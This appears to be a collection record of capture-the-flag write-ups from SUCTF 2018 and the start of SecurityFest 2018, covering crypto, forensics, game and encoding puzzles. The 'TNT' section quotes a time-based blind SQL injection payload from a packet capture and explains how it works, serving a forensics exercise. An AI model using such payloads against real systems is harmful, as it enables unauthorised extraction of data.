359 + 349\n    x1 = y18 * 367 + 118\n    x1 = y19 * 373 + 317\n\nWe have one less equation to worry about! We can keep doing this again and again, until we hit:\n\n    j1 = k1 * 373 + 2\n\nAt this point, we know that whatever value of `k1` we choose, `j1` will be a valid solution to the previous set of equations. So let's choose `k1 = 0` and hence `j1 = 2`. Then we propagate this value back over the previous equations, where we only need to substitute the value in the first equation to get another concrete number that we can then substitute, etc etc.\n\n([full implementation here](scripts/sandgame.py))\n\nAfter all of this we get the number:\n\n    481883688299168926385644485997804052926336296745\n\n`hex`, `bytes`, and adding the `SUCTF{}`:\n\n`SUCTF{This_is_the_CRT_xwg)}`\n\n(Chinese remainder theorem?!)\n\n## 465 Misc / Cycle ##\n\n**Description**\n\n> flag格式如下: flag{.+}\n\n**Translated description**\n\n> The flag format is as follows: flag{.+}\n\n**Files given**\n\n - `cycle.py` - script used to create `cipher.txt`\n - `cipher.txt` - Base64 encoded ciphertext\n\n**Solution**\n\nLooking through `cycle.py`, we see that it uses the middle part of the flag (i.e. not `flag{` or `}`) as a key to XOR encrypt some English text. That last part is presumably indicated by:\n\n    assert flag.languageOfPlain == \"English\"\n\nWe also see that the key length is:\n\n    assert len(key) > 1\n    assert len(key) < 50\n\nWe don't know which, but clearly this is much shorter than the plaintext which has 1853 bytes after Base64 decoding. XOR encryption is effective when used as a [one-time pad](https://en.wikipedia.org/wiki/One-time_pad), i.e. neither the key nor the plaintext are known or predictable. However, the key is used many times to encrypt the full plaintext!\n\nFirst step is to find out the length of the key. Assuming the length of the key was `n`, we separate the ciphertext bytes into `n` \"buckets\". The first character of the key is used to encrypt `plain[0]`, `plain[n]`, `plain[2 * n]`, etc. The second character ecnrypts `plain[1]`, `plain[n + 1]`, and so on. So these groups of bytes are independent of each other with respect to the encryption scheme. There is one more assumption we can make - the plaintext bytes of each of the `n` categories have a consistent frequency spectrum. For example, in English text, ` ` (space) is the most common character, followed by the letters `e`, `t`, `a`, etc. Unless the plaintext is very special, if we take an arbitrary sample of every `x`th byte, we expect to still see the same frequency spectrum. If they are all XOR-ed with the same key byte, the spectrum will be different superficially, but in fact its values will only be shuffled around.\n\nWith this in mind, we visualise the frequency spectrum of each possible key length between 2 and 49. Most of the frequency spectra look quite blurry, which means that the sampled bytes were XOR-ed with two or more different key bytes.\n\n**Key length: 23**\n\n![](screens/cycle23.png)\n\n**Key length: 24**\n\n![](screens/cycle24.png)\n\n**Key length: 25**\n\n![](screens/cycle25.png)\n\nBut hopefully you can see that for key length 24 the spectra look much sharper. Thus we can conclude that the key length is 24 bytes.\n\nThe next step is to figure our what the key actually is. As I already mentioned above, we know roughly what an English frequency spectrum is like. We could use an actual sample of English text to generate a reference frequency spectrum, but in practice the frequency spectrum of \"Lorem ipsum\" is good enough:\n\n> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n\nOnce again, each of the `n` (24) groups of bytes are independent of one another with respect to the encryption, because they use different parts of the key. So we can simply check all 256 possible values for each of the 24 key bytes and only keep the ones that produce the spectrum closest to our reference. After doing this we get:\n\n    key:\n      Somethhnf Jwst Like!This\n    decrypted text:\n      The Ch`iosmmkers?Boldplay(Chsir Mcrtin)\n      Aodrew Taggast?Ahris Mastin\n      Andrew!T`ggcrt?Chsistopher M`ruin. Guy Besryman, Jonoy!Buakland ?Will Chamqinn?Alex P?ll\n      Andrew Uafgapt?Aley Pall\n      ...\n\nAt this point we don't have the correct key yet, but we can now easily see what the key (and the plaintext) are meant to be. After changing the key to `Something Just Like This`, we see that the plaintext is the lyrics to the song of the same name. So our flag is:\n\n`flag{Something Just Like This}`\n\n## 740 Misc / TNT ##\n\n**Description**\n\n> Hint1 hint:base64 only contians A-Z a-z +=/ find the missing character and the unnecessary character\n\n**Files given**\n\n - `tnt.pcap` - a packet capture of somebody using blind SQL injection to gather data from a server (a [Damn Vulnerable Web Application](http://www.dvwa.co.uk/) instance)\n\n**Solution**\n\nThe packet capture is quite large to look at in Wireshark but luckily, it only contains TCP packets and their HTTP equivalents. All the HTTP packets are pairs of requests by the client and responses by the server, the ordering is neat, there is no packet loss, etc. Taking a couple of packets at random, we see a lot of them are of the form:\n\n    GET /vulnerabilities/sqli_blind/?id=2%27%20AND%202301%3DIF%28%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28comment%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.guestbook%20ORDER%20BY%20name%20LIMIT%200%2C1%29%2C235%2C1%29%29%21%3D97%29%2CSLEEP%281%29%2C2301%29%20AND%20%27sXCb%27%3D%27sXCb&Submit=Submit HTTP/1.1\n\nWe can URL decode (`unescape` in JavaScript) the `id` parameter above to get:\n\n    2' AND 2301=IF((ORD(MID((SELECT IFNULL(CAST(comment AS CHAR),0x20) FROM dvwa.guestbook ORDER BY name LIMIT 0,1),235,1))!=97),SLEEP(1),2301) AND 'sXCb'='sXCb\n\nAfter injecting, we can imagine that the full SQL query takes the form:\n\n    SELECT * FROM sometable WHERE\n      id = '2'\n      AND 2301 = IF(\n        (ORD(\n          MID(\n            (SELECT IFNULL(\n              CAST(comment AS CHAR), 0x20\n            ) FROM dvwa.guestbook ORDER BY name LIMIT 0, 1)\n            , 235, 1\n          ))\n        != 97), SLEEP(1), 2301)\n      AND 'sXCb' = 'sXCb'\n\nWhat does it do? We perform a query that seems to select data from a table. But remember - this is blind SQL injection, we don't actually get any output from the server, no matter what our SQL query produced. But the server will not give us any kind of response until the SQL query is executed to completion, so we use the `SLEEP` command conditionally. So the above query uses a subquery to select the `comment` column from the first row of `dvwa.guestbook`, then it extracts the 235th character using `MID`, and takes its Unicode character value using `ORD`. Finally, it compares it to 97. If it is not 97, `SLEEP(1)` is executed (and the server waits one second), if it is 97, the query succeeds immediately.\n\nThe requests in the packet capture are made in rapid succession, clearly performed by some sort of automatic SQL injection tool. In general, the characters are extracted using binary search, so on average, 7 queries are needed for each character, not ~64 that would be needed if only `==` and `!=` comparisons were used.\n\nThere are a lot of such requests in the packet capture, extracting data such as the table schema, column names, etc. But the only useful queries to us are those that are like the one above - extracting the `comment` text.\n\nWe can export the packet data from Wireshark into a CSV for easier parsing. Then based on the times between requests and responses we can automatically extract the same data that the SQL injection tool gathered.\n\n([full SQL injection extraction script here](scripts/TNT.hx))\n\nThat gives us the following result:\n\n    QlpoOTFBWSZTWRCesQgAAKZ///3ry/u5q9q1yYom/PfvRr7v2txL3N2uWv/aqTf7\n    ep/usAD7MY6NHpAZAAGhoMjJo0GjIyaGgDTIyGajTI0HqAAGTQZGTBDaTagbUNpp\n    kIEGQaZGjIGmgMgMjIyAaAPU9RpoMjAjBMEMho0NMAjQ00eo9QZNGENDI0zUKqfl\n    EbU0YhoADQDAgAaaGmmgwgMTE0AGgAyNMgDIGmTQA0aNGg0HtQQQSBQSMMfFihJB\n    AKBinB4QdSNniv9nVzZlKSQKwidKifheV8cQzLBQswEuxxW9HpngiatmLK6IRSgv\n    QZhuuNgAu/TaDa5khJv09sIVeJ/mhAFZbQW9FDkCFh0U2EI5aodd1J3WTCQrdHar\n    Q/Nx51JAx1b/A9rucDTtN7Nnn8zPfiBdniE1UAzIZn0L1L90ATgJjogOUtiR77tV\n    C3EVA1LJ0Ng2skZVCAt+Sv17EiHQMFt6u8cKsfMu/JaFFRtwudUYYo9OHGLvLxgN\n    /Sr/bhQITPglJ9MvCIqIJS0/BBxpz3gxI2bArd8gnF+IbeQQM3c1.M+FZ+E64l1c\n    cYFRa26TC6uGQ0HnstY5/yc+nAP8Rfsim4xoEiNEEZclCsLAILkjnz6BjVshxBdy\n    RThQkBCesQg=\n\nIt looks very much like Base64, but decoding it as is fails. Now it is time to use the hint given in the challenge description. Looking through the Base64 alphabet, we see that it never uses `.` as a character (on the third-to-last line). On the other hand, we can check which characters are used, and `X` is never used once, unlike every other character of the alphabet. So, we replace the `.` with an `X` and now the decoded data is:\n\n    $ base64 -D < baseFixed.txt | xxd\n    0000000: 425a 6839 3141 5926 5359 109e b108 0000  BZh91AY&SY......\n    0000010: a67f fffd ebcb fbb9 abda b5c9 8a26 fcf7  .............&..\n    0000020: ef46 beef dadc 4bdc ddae 5aff daa9 37fb  .F....K...Z...7.\n    0000030: 7a9f eeb0 00fb 318e 8d1e 9019 0001 a1a0  z.....1.........\n    0000040: c8c9 a341 a323 2686 8034 c8c8 66a3 4c8d  ...A.#&..4..f.L.\n    0000050: 07a8 0006 4d06 464c 10da 4da8 1b50 da69  ....M.FL..M..P.i\n    0000060: 9081 0641 a646 8c81 a680 c80c 8c8c 8068  ...A.F.........h\n    0000070: 03d4 f51a 6832 3023 04c1 0c86 8d0d 3008  ....h20#......0.\n    0000080: d0d3 47a8 f506 4d18 4343 234c d42a a7e5  ..G...M.CC#L.*..\n    0000090: 11b5 3462 1a00 0d00 c080 069a 1a69 a0c2  ..4b.........i..\n    00000a0: 0313 1340 0680 0c8d 3200 c81a 64d0 0346  ...@....2...d..F\n    00000b0: 8d1a 0d07 b504 1048 1412 30c7 c58a 1241  .......H..0....A\n    00000c0: 00a0 629c 1e10 7523 678a ff67 5736 6529  ..b...u#g..gW6e)\n    00000d0: 240a c227 4a89 f85e 57c7 10cc b050 b301  $..'J..^W....P..\n    00000e0: 2ec7 15bd 1e99 e089 ab66 2cae 8845 282f  .........f,..E(/\n    00000f0: 4198 6eb8 d800 bbf4 da0d ae64 849b f4f6  A.n........d....\n    0000100: c215 789f e684 0159 6d05 bd14 3902 161d  ..x....Ym...9...\n    0000110: 14d8 4239 6a87 5dd4 9dd6 4c24 2b74 76ab  ..B9j.]...L$+tv.\n    0000120: 43f3 71e7 5240 c756 ff03 daee 7034 ed37  C.q.R@.V....p4.7\n    0000130: b367 9fcc cf7e 205d 9e21 3550 0cc8 667d  .g...~ ].!5P..f}\n    0000140: 0bd4 bf74 0138 098e 880e 52d8 91ef bb55  ...t.8....R....U\n    0000150: 0b71 1503 52c9 d0d8 36b2 4655 080b 7e4a  .q..R...6.FU..~J\n    0000160: fd7b 1221 d030 5b7a bbc7 0ab1 f32e fc96  .{.!.0[z........\n    0000170: 8515 1b70 b9d5 1862 8f4e 1c62 ef2f 180d  ...p...b.N.b./..\n    0000180: fd2a ff6e 1408 4cf8 2527 d32f 088a 8825  .*.n..L.%'./...%\n    0000190: 2d3f 041c 69cf 7831 2366 c0ad df20 9c5f  -?..i.x1#f... ._\n    00001a0: 886d e410 3377 355c cf85 67e1 3ae2 5d5c  .m..3w5\\..g.:.]\\\n    00001b0: 7181 516b 6e93 0bab 8643 41e7 b2d6 39ff  q.Qkn....CA...9.\n    00001c0: 273e 9c03 fc45 fb22 9b8c 6812 2344 1197  '>...E.\"..h.#D..\n    00001d0: 250a c2c0 20b9 239f 3e81 8d5b 21c4 1772  %... .#.>..[!..r\n    00001e0: 4538 5090 109e b108                      E8P.....\n\nThe `BZ` prefix gives this away as a bzip file.\n\n    $ base64 -D < baseFixed.txt | bunzip2 | xxd\n    0000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101  .7zXZ......F..!.\n    0000010: 1600 0000 742f e5a3 0101 131f 8b08 0803  ....t/..........\n    0000020: e104 5b00 0333 332e 3333 3300 fb7f e33f  ..[..33.333....?\n    0000030: 8b08 0303 0307 c3dc e8ed 3e06 f36c f217  ..........>..l..\n    0000040: 0379 6b80 9815 888d 4080 fb43 5ada c4a4  .yk.....@..CZ...\n    0000050: 740b fb85 331a 1ba7 3332 cd7b 1562 68a2  t...3...32.{.bh.\n    0000060: 617c c2c0 a0c1 70f2 c5a4 e66d cb27 deae  a|....p....m.'..\n    0000070: 4de9 9d29 29d1 c874 6e9f 620f d3df 7cab  M..))..tn.b...|.\n    0000080: 6b3e 0f22 bf54 3f3a 9239 a7eb 77fc 1e9b  k>.\".T?:.9..w...\n    0000090: f8a4 f347 aaea efbd 625f 7f27 7daa 86cf  ...G....b_.'}...\n    00000a0: 85b4 00f6 5557 1832 fdff 2f9e 5c2b ba66  ....UW.2../.\\+.f\n    00000b0: 6eaf 23a3 c684 39f3 67cf 9e7f fc83 e287  n.#...9.g.......\n    00000c0: 2d92 c719 fbea 6df7 5f7a 57ea 2bb8 57da  -.....m._zW.+.W.\n    00000d0: f8e3 7bd9 c6a0 eff7 663e 8f4b 8dda f264  ..{.....f>.K...d\n    00000e0: fd8d fcbb 590f de26 09ff dd75 f961 47ae  ....Y..&...u.aG.\n    00000f0: 6933 b335 3343 8037 2393 3c03 2e7f a830  i3.53C.7#.<....0\n    0000100: 4080 0294 06fb 8a0b ca65 6490 6030 54d9  @........ed.`0T.\n    0000110: a0ef f6e9 3223 3a1d e0cd ca06 51c3 c810  ....2#:.....Q...\n    0000120: 0ea4 8f81 0d00 0098 1ba4 0e33 0100 0000  ...........3....\n    0000130: fb83 8735 550b f5f2 0001 ac02 9402 0000  ...5U...........\n    0000140: b5f4 ede6 b1c4 67fb 0200 0000 0004 595a  ......g.......YZ\n\nHmm. 7zip?\n\n    $ base64 -D < baseFixed.txt | bunzip2 | file -\n    /dev/stdin: xz compressed data\n\nNope.\n\n    $ base64 -D < baseFixed.txt | bunzip2 | unxz | xxd\n    0000000: 1f8b 0808 03e1 045b 0003 3333 2e33 3333  .......[..33.333\n    0000010: 00fb 7fe3 3f8b 0803 0303 07c3 dce8 ed3e  ....?..........>\n    0000020: 06f3 6cf2 1703 796b 8098 1588 8d40 80fb  ..l...yk.....@..\n    0000030: 435a dac4 a474 0bfb 8533 1a1b a733 32cd  CZ...t...3...32.\n    0000040: 7b15 6268 a261 7cc2 c0a0 c170 f2c5 a4e6  {.bh.a|....p....\n    0000050: 6dcb 27de ae4d e99d 2929 d1c8 746e 9f62  m.'..M..))..tn.b\n    0000060: 0fd3 df7c ab6b 3e0f 22bf 543f 3a92 39a7  ...|.k>.\".T?:.9.\n    0000070: eb77 fc1e 9bf8 a4f3 47aa eaef bd62 5f7f  .w......G....b_.\n    0000080: 277d aa86 cf85 b400 f655 5718 32fd ff2f  '}.......UW.2../\n    0000090: 9e5c 2bba 666e af23 a3c6 8439 f367 cf9e  .\\+.fn.#...9.g..\n    00000a0: 7ffc 83e2 872d 92c7 19fb ea6d f75f 7a57  .....-.....m._zW\n    00000b0: ea2b b857 daf8 e37b d9c6 a0ef f766 3e8f  .+.W...{.....f>.\n    00000c0: 4b8d daf2 64fd 8dfc bb59 0fde 2609 ffdd  K...d....Y..&...\n    00000d0: 75f9 6147 ae69 33b3 3533 4380 3723 933c  u.aG.i3.53C.7#.<\n    00000e0: 032e 7fa8 3040 8002 9406 fb8a 0bca 6564  ....0@........ed\n    00000f0: 9060 3054 d9a0 eff6 e932 233a 1de0 cdca  .`0T.....2#:....\n    0000100: 0651 c3c8 100e a48f 810d 0000 981b a40e  .Q..............\n    0000110: 3301 0000                                3...\n    $ base64 -D < baseFixed.txt | bunzip2 | unxz | file -\n    /dev/stdin: gzip compressed data, was \"33.333\", from Unix, last modified: Wed May 23 04:33:23 2018\n\nGzip next...\n\n    $ base64 -D < baseFixed.txt | bunzip2 | unxz | gunzip | xxd\n    0000000: ffd8 ff04 1400 0000 0800 9d5b b74c 309e  ...........[.L0.\n    0000010: 3c6f a300 0000 ac00 0000 0500 0000 3232  <o............22\n    0000020: 3232 320b f066 6691 6267 383f a198 8181  222..ff.bg8?....\n    0000030: 9701 029e ea54 3134 2833 c830 3080 3193  .....T14(3.00.1.\n    0000040: d162 83b6 a791 db7d 648d 9919 1881 02ce  .b.....}d.......\n    0000050: be21 8c02 fd6f 3ad6 4ce0 59f4 7be2 c469  .!...o:.L.Y.{..i\n    0000060: 9c8a fb5f bc3c 5f62 cfc4 7a7f deea 07af  ..._.<_b..z.....\n    0000070: dc67 9528 4cd0 6650 07aa d400 694f ffa3  .g.(L.fP....iO..\n    0000080: 937d 15ac 9d8d 4101 2890 9c9f 9b9b 9fc7  .}....A.(.......\n    0000090: f021 f0b4 19c7 018e 7f3d bfd2 ee75 4d11  .!.......=...uM.\n    00000a0: bd1b 33f1 ef1d 8152 f7de 99e7 5e65 5ab4  ..3....R....^eZ.\n    00000b0: e4af d86f dd6a e0ed 6213 fdba d3e1 886d  ...o.j..b......m\n    00000c0: 3583 033b 0300 504b 0102 1f00 1400 0000  5..;..PK........\n    00000d0: 0800 9d5b b74c 309e 3c6f a300 0000 ac00  ...[.L0.<o......\n    00000e0: 0000 0500 2400 0000 0000 0000 2000 0000  ....$....... ...\n    00000f0: 0000 0000 3232 3232 320a 0020 0000 0000  ....22222.. ....\n    0000100: 0001 0018 0031 24b0 2f46 f2d3 0131 24b0  .....1$./F...1$.\n    0000110: 2f46 f2d3 0131 24b0 2f46 f2d3 0150 4b05  /F...1$./F...PK.\n    0000120: 0600 0000 0001 0001 0057 0000 00c6 0000  .........W......\n    0000130: 0000 00                                  ...\n\nAt this point `file` will tell us this is a JPEG image, based solely on the first 2 bytes. However, no program will show this \"image\", and apart from the header, it really does not look like a JPEG image. In fact, we see two `PK` words in the hexdump. These are magic bytes occurring in `zip` files. We can patch the first four bytes to `50 4B 03 04`, which indicate a file record, which is what `zip` files typically start with.\n\n    $ zipinfo zipFixed.zip\n    Archive:  zipFixed.zip   307 bytes   1 file\n    -rw-a--     3.1 fat      172 bx defN 23-May-18 11:28 22222\n    1 file, 172 bytes uncompressed, 163 bytes compressed:  5.2%\n\nThere is a file called `22222`.\n\n    $ unzip -p zipFixed.zip 22222 | xxd\n    0000000: 504b 0304 1a07 00cf 9073 0000 0d00 0000  PK.......s......\n    0000010: 0000 0000 e52c 7a00 8023 001c 0000 001c  .....,z..#......\n    0000020: 0000 0002 32a3 3086 e559 b74c 1d33 0300  ....2.0..Y.L.3..\n    0000030: 0100 0000 434d 5401 108f ec88 ac90 0ca2  ....CMT.........\n    0000040: fb91 9196 0921 bfe8 e9cf 743f 0205 df9e  .....!....t?....\n    0000050: abe0 ea47 9a74 2090 2b00 2700 0000 2800  ...G.t .+.'...(.\n    0000060: 0000 0267 fc2c 6bd5 59b7 4c1d 3306 0020  ...g.,k.Y.L.3.. \n    0000070: 0000 0063 6f6d 6d6f 6e00 f051 cb36 08c0  ...common..Q.6..\n    0000080: 08fe 8cfa 66de 8a94 15dd 5c91 fddc 1075  ....f.....\\....u\n    0000090: 478d 99ce ea69 3884 6fa8 bf3b 8530 4b44  G....i8.o..;.0KD\n    00000a0: 3c5b eb89 40c4 3d7b 0040 0700            <[..@.={.@..\n\nAnother `zip` file? Nothing actually extracts this and we can see that the structures are far from what we would expect. Scrolling through the great [File signatures table](https://www.garykessler.net/library/file_sigs.html), we find something interesting. `rar` archives start with `52 61 72 21 1A 07 00`. The first four bytes are clearly wrong, but everything after looks promising. So we patch the first four bytes to `Rar!` and finally we extract a file called `common`:\n\n`suctf{233333th1s1sf1ag23333333333333333}`\n\nFun challenge.\n\n## 540 Misc / Game (partial) ##\n\n**Description**\n\n> nc game.suctf.asuri.org:10000\n\n**No files provided**\n\n**Solution**\n\nAfter login, we have a standard PoW:\n\n    ===========================================================================\n                                   _..._                          \n                                .-'_..._''.                       \n                              .' .'      '.\\                      \n                             / .'                           _.._  \n                            . '                   .|      .' .._| \n                            | |                 .' |_     | '     \n           _       _    _   | |               .'     |  __| |__   \n         .' |     | '  / |  . '              '--.  .-' |__   __|  \n        .   | /  .' | .' |   \\ '.          .    |  |      | |     \n      .'.'| |//  /  | /  |    '. `._____.-'/    |  |      | |     \n    .'.'.-'  /  |   `'.  |      `-.______ /     |  '.'    | |     \n    .'   \\_.'   '   .'|  '/              `      |   /     | |     \n                 `-'  `--'                      `'-'      |_|     \n    ===========================================================================\n    Prove your heart!\n    sha256(Lz8EQUrMVsvt + ****) == ea98abdb8cdc498f14e8422c96ca003c69a56408827c8630981c416077350e75\n\n([PoW solver](scripts/pow.py))\n\nAfter which, we are presented with the rules of the game:\n\n    ===========================================================================\n    Let's pick stones!\n    There are some stones, you and me will alternatively pick them, the winner is who take the last one.\n    If you think you cannot win, input 'GG' to skip this round. You have 3 chances to skip.\n    ===========================================================================\n    Round 1\n    There are 13052 stones, you can pick 1 - 823 once\n    13052 stones left\n    Your turn:\n\nSeems familiar. It is a variant of Nim; specifically the [Subtraction game](https://en.wikipedia.org/wiki/Nim#The_subtraction_game_S(1,_2,_._._.,_k)).Assuming we can take `n` stones, we aim to end each turn such that the number of remaining stones is `0 mod (n + 1)`. Then whatever the opponent's turn, we can take as many as it takes to get into the same remainder. After 20 rounds of this, we get:\n\n    ===========================================================================\n    I think you can try something difficult!\n    Now we have two piles of stones, you can take any number of stones in one pile or take the same number in both two piles. Also, who pick the last stone is the winner.\n    For example, if you want to pick 2 stones in the pile 0, input 2 0, if you want to pick 1 stone in the pile 1, input 1 1.\n    If you want to pick 3 stones in both piles, input 3 2.\n    You have 8 chances to input 'GG' to skip this round.\n    ===========================================================================\n\nAlso looks kinda Nim-y. It is called (Wythoff's game)[https://en.wikipedia.org/wiki/Wythoff%27s_game]. We solve this phase of the game by precalculating the \"cold positions\" (losing states) for all coordinates 0 - 100000:\n\n    def makeWythoff(end):\n        wythoff = [0] * int(end * phi)\n        for i in range(end):\n            n = int(i * phi)\n            m = n + i\n            if n < len(wythoff):\n                wythoff[n] = m\n            if m < len(wythoff):\n                wythoff[m] = n\n    makeWythoff(100000)\n\nWe lose if we are given a cold position at the beginning, otherwise there is always a move that puts the opponent into a cold position. After 20 rounds of this, we get to the third and presumably final phase. Unfortunately, I cannot show you the exact text.\n\nThe final phase was actual Nim, played with 5 piles. The strategy involves calculating the \"nim-sum\", i.e. the XOR of all the pile sizes. At each step we aim to reduce a pile to its size XOR the overall nim-sum (i.e. we try to reduce a pile to the nim-sum of the other piles), if possible.\n\nHere is the full disclosure:\n\nWhile the solver I wrote worked well and produced instant responses to all three phases of the game, I could not get the flag. The game server was located in China and the best RTT I could get was 150ms with a VPS in Seoul. Thanks to the timeout I never got further than round 11 of the third phase. Very annoying.\n\n## 89 Misc / 签到 ##\n\n**Description**\n\n> Welcome To SUCTF 2018\n\n**Files provided**\n\n - `somehash.file` - `KNKUGVCGPN3WK3DDN5WWKX3UN5PXG5LDORTDEMBRHB6Q====`\n\n**Solution**\n\nThe file looks like Base64, but decoding doesn't work. And there are 4 `=` padding bytes at the end, which never happens in Base64. But, there are other ASCII-encoding methods, such as [Base32](https://en.wikipedia.org/wiki/Base32). We see that there are no characters in the file that are not in the standard RFC 4648 Base32 alphabet. So (Haxe):\n\n    var data = \"KNKUGVCGPN3WK3DDN5WWKX3UN5PXG5LDORTDEMBRHB6Q\";\n    var alphabet = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\";\n    trace(haxe.crypto.BaseCode.decode(data, alphabet));\n\nWhich gives us the flag:\n\n`SUCTF{welcome_to_suctf2018}`\n", "timestamp": "2025-10-24T11:38:54.945862"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-05-31-SecurityFest/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-05-31-SecurityFest/README.md", "content": "# 2018-05-31-SecurityFest #\n\n[CTFTime link](https://ctftime.org/event/622) | [Website](https://securityfest.ctf.rocks/dashboard) | [Challenge Writer Write-ups](https://klondike.es/klog/2018/06/03/challenge-writer-write-up-security-fest-2018-ctf-challs/)\n\n---\n\n## Challenges ##\n\n### Misc ###\n\n - [x] [51 Sanity check](#51-misc--sanity-check)\n - [ ] 495 The last flight of the osiris\n - [ ] 468 Tracing mr. anderson\n - [x] [51 Zion](#51-misc--zion)\n - [x] [407 All the keys](#407-misc--all-the-keys)\n - [x] [51 Everywhere](#51-misc--everywhere)\n - [x] [51 Mr.reagan](#51-misc--mrreagan)\n\n### Rev ###\n\n - [x] [51 Bluepill](#51-rev--bluepill)\n\n### Pwn ###\n\n - [ ] 364 Cypher\n - [ ] 54 Sshnuke\n - [ ] 499 Goldrain\n - [ ] 485 Greenrain\n - [ ] [261 Bowrain](#261-pwn--bowrain) (got the flag just after CTF closed)\n\n### Crypto ###\n\n - [ ] 500 Agent communications\n - [x] [485 The note](#485-crypto--the-note)\n - [ ] 499 Intercepting sentinels\n - [x] [51 The oracle](#51-crypto--the-oracle)\n\n### Web ###\n\n - [ ] 51 Screensavers\n - [ ] 314 Pongdom\n - [x] [51 Excesss](#51-web--excesss)\n - [ ] 499 Excesss ii\n\n---\n\n## 51 Misc / Sanity check ##\n\n**Description**\n\n> Flag is in the topic of #securityfest-ctf @ irc.freenode.net\n\n**No files provided**\n\n**Solution**\n\nLogin to Freenode, `/join #securityfest-ctf`, `/topic`:\n\n`sctf{securityfestctf_2018}`\n\n## 51 Misc / Zion ##\n\n**Description**\n\n> Is this the access codes to the Zion mainframe?. We have only bits and pieces of information.\n\n**Files provided**\n\n - [`zion.tar.gz`](files/zion.tar.gz) - archive:\n   - `YouKnow`\n\n**Solution**\n\nAfter extracting the `YouKnow` file, we can see that there are many references to Word, e.g. `word/document.xml`. If we make Word open the file, it complains a bit, but it opens it just fine as an Office Open XML document. The contents show some flavour text and a red rabbit:\n\n![](screens/zion1.png)\n\nAt first I thought this might be encoding a program in some [esoteric language](https://esolangs.org/wiki/Main_Page), but I didn't have much hope, since there was very little actual text data shown in the image.\n\nBack to looking at the file in a hex editor, we can first notice that it starts with `PK`, just like a zip file. And indeed, we can unzip the file and it contains various XML files, as well as the red rabbit in a `media` folder. But there is one more weird thing – if we scroll all the way to the end, we see `KP`. And not far behind that, `sler./sler_`? In the extracted data, we did get a `_rels/.rels` folder. It is reversed, but why? Around the middle of the file we see where the reversal happens, but the mirror images are not exactly the same.\n\n    0003820: 0000 382e 0000 776f 7264 2f74 6865 6d65  ..8...word/theme\n    0003830: 2f74 6865 6d65 312e 786d 6c50 4b01 0214  /theme1.xmlPK...\n    0003840: 0014 0008 0808 00bc 94b6 4c29 ef3d 8b4a  ..........L).=.J\n    0003850: 0100 0016 0500 0013 0000 0000 0000 0000  ................\n    0003860: 0000 0000 002f 3400 005b 436f 6e74 656e  ...../4..[Conten\n    0003870: 745f 5479 7065 735d 2e78 6d6c 504b 0506  t_Types].xmlPK..\n    0003880: 0000 0000 0b00 0b00 c202 0000 ba35 0000  .............5..\n    0003890: 0000 0000 0000 340e 0000 0303 000c 000c  ......4.........\n    00038a0: 0000 0000 0605 4b50 6c6d 782e 5d73 6570  ......KPlmx.]sep\n    00038b0: 7954 5f74 6e65 746e 6f43 5b00 0032 7900  yT_tnetnoC[..2y.\n    00038c0: 0000 0000 0000 0000 0000 0000 1300 0005  ................\n    00038d0: 9300 0001 54a6 0075 bf4c b694 7c00 0808  ....T..u.L..|...\n    00038e0: 0800 1400 1402 014b 506c 6d78 2e31 656d  .......KPlmx.1em\n    00038f0: 6568 742f 656d 6568 742f 6472 6f77 0000  eht/emeht/drow..\n    0003900: 2c82 0000 0000 0000 0000 0000 0000 0015  ,...............\n\nSome of the numbers don't match. So let's finally reverse the file and unzip it again. And indeed, there is another image, but this time showing the flag!\n\n![](screens/zion2.png)\n\n`sctf{m41nfr4m3_4cc3ss_c0d3_1337_4lw4s}`\n\n## 407 Misc / All the keys ##\n\n**Description**\n\n> Trinity needs help, find the key in time and discover the Matrix.\n\n**Files provided**\n\n - [`allthekeys.tar.gz`](files/allthekeys.tar.gz)\n\n**Solution**\n\nAfter extracting the archive, we see that it includes a bunch of files with random 4-character filenames. Looking around with a hexeditor and grep, we can categorise the files into folders as follows:\n\n - `cert/` - 1 SSL certificate file\n - `binary/` - 66 binary files\n - `ec/` - 65 private EC keys\n - `empty/` - 28 empty files\n - `rsa/` - 4 private RSA keys\n\nSince the number of private keys and binary files was (more or less) the same, my first attempt was to decrypt the binary files with the private keys we have. I tested at first with the RSA keys, e.g.:\n\n    for binary in binary/*; do\n      for key in rsa/*; do\n        openssl rsautl -in \"$binary\" -inkey \"$key\" -decrypt\n      done\n    done\n\nBut all of these failed. My working theory was that there would be a 1-to-1 correspondence between the keys and the binary files, so seeing as none of the RSA keys worked on any of the binary files, I tried something else.\n\nLooking more closely at the certificate file, it includes some human-readable data, as well as an encoded certificate representation within `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----`. What happens if we make OpenSSL parse this encoded representation? Maybe the encoded data is actually different.\n\n    $ openssl x509 -in cert/6c8e -text -noout\n\nThe output is pretty much the same, but our original file has some extra data:\n\n    Response Single Extensions:\n          CT Certificate SCTs:\n          SCT validation status: valid\n          Signed Certificate Timestamp:\n               Version   : v1 (0x0)\n               Log       : Morpheus Tesfytiruces CT log\n               Log ID    : SE:CF:68:74:74:70:73:3a:2f:2f:6d:69:6b:65:79:2e:\n                           63:74:66:2e:72:6f:63:6b:73:00:00:00:00:00:00:00\n          Timestamp : Jun 1 08:05:26.276 1999 GMT\n          Extensions: none\n          Signature : ecdsa-with-SHA256\n               13:37:13:37:13:37:13:37:13:37:13:37:13:37:13:37:\n               13:37:13:37:13:37:13:37:13:37:13:37:13:37:13:37:\n               13:37:13:37:13:37:13:37:13:37:13:37:13:37:13:37:\n               13:37:13:37:13:37:13:37:13:37:13:37:13:37:13:37:\n               13:37:13:37:13:37:13\n\nInteresting. The signature is obviously fake, but looking closely at the log ID, it doesn't look like binary data. And indeed, if we convert `68:74:70:...:6F:63:6B` to ASCII, we get:\n\n    https://mikey.ctf.rocks\n\nIf we actually try to access the website, it doesn't really work. The server is saying `400 No required SSL certificate was sent`. We need to send a certificate TO the server? Apparently there is a thing called client certificates, where the server requests that the client sends a certificate. Very useful information, and we can now guess that the certificate we have is not the server certificate, but a 